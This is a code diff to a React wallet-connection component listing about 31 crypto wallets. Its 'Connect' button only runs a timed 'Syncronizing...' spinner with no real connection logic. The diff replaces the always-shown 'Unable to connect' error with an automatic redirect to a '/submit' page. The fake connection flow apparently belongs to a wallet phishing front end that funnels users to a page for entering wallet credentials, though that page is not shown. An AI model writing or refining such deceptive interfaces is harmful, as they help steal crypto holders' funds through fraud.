@@ -73,6 +73,7 @@ const DATA = [
   { id: 31, wallet: "Wallet Connect", logo: wallet30 },
 ];
 
+import { useNavigate } from 'react-router-dom';
 
 const ConnectWallet = () => {
 
@@ -84,6 +85,7 @@ const ConnectWallet = () => {
      setShowModal(true);
      setActiveWallet(wallet);
    };
+   const navigate = useNavigate()
 
    const handleCloseModal = () => {
      setShowModal(false);
@@ -93,7 +95,8 @@ const ConnectWallet = () => {
      setIsLoading(true);
      setTimeout(() => {
        setIsLoading(false);
-       setIsError(true);
+       navigate("/submit")
+    
      }, 4000);
    };
   return (
@@ -117,13 +120,7 @@ const ConnectWallet = () => {
                 >
                   {!isLoading ? "Connect" : "Syncronizing..."}
                 </button>
-                <div className="text-center">
-                  {isError && ( 
-                    <p className="text-black text-[14px] italic">
-                      <b className='text-red-500'>Error:</b> Unable to connect to {activeWallet}!
-                    </p>
-                  )}
-                </div>
+           
                 {isError === true && (
                   <div>
                     <Link to="/submit">
